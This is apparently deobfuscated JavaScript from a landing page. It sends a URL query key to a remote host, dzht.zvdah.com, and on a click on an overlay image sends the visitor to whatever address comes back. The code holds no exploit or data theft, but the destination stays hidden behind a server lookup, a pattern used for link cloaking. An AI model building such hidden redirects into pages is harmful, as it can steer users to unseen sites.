//Thu Jul 31 2025 08:43:23 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
(function () {})();
var _0x4ce2db = document.querySelector(".imgOver");
_0x4ce2db.style.display = "none";
const _0x2b8d8a = ["//dzht.zvdah.com"],
  _0x510aa2 = Math.floor(Math.random() * _0x2b8d8a.length),
  _0x2caf0e = _0x2b8d8a[_0x510aa2],
  _0x3a651d = window.location.search;
var _0x1ec98f = "";
let _0x413a36 = new Object();
if (_0x3a651d.indexOf("?") != -1) {
  let _0x52d20c = _0x3a651d.substr(_0x3a651d.indexOf("?") + 1);
  _0x52d20c = _0x52d20c.replace(/&amp;/g, "&");
  let _0x3ec76e = _0x52d20c.split("&");
  for (let _0x25a31d = 0; _0x25a31d < _0x3ec76e.length; _0x25a31d++) {
    _0x413a36[_0x3ec76e[_0x25a31d].split("=")[0]] = decodeURI(_0x3ec76e[_0x25a31d].split("=")[1]);
  }
  const _0x4c28e9 = Object.keys(_0x413a36)[0].includes("response") ? Object.values(_0x413a36)[1] : Object.values(_0x413a36)[0];
  if (typeof _0x4c28e9 !== "undefined" && _0x4c28e9 !== null && _0x4c28e9 !== "") {
    let _0x1fc861 = new XMLHttpRequest();
    _0x1fc861.open("GET", _0x2caf0e + "/api/find/key/" + _0x4c28e9);
    _0x1fc861.onload = function () {
      _0x4ce2db.style.display = "block";
      if (_0x1fc861.status === 200) {
        {
          if (_0x1fc861.responseText != "") {
            {
              const _0x37c865 = JSON.parse(_0x1fc861.responseText);
              if (_0x37c865.code == 200) {
                {
                  if (typeof _0x413a36.tgm !== "undefined" && _0x413a36.tgm !== null && _0x413a36.tgm !== "") _0x1ec98f = _0x37c865.data.url + "&tgm=" + _0x413a36.tgm;else {
                    _0x1ec98f = _0x37c865.data.url;
                  }
                }
              } else {
                _0x4ce2db.style.display = "none";
                alert(_0x37c865.msg);
              }
            }
          }
        }
      }
    };
    _0x1fc861.send();
  }
}
var _0x4ffbcf = document.querySelector(".imgOver");
_0x4ffbcf.addEventListener("click", function () {
  window.location.replace(_0x1ec98f);
});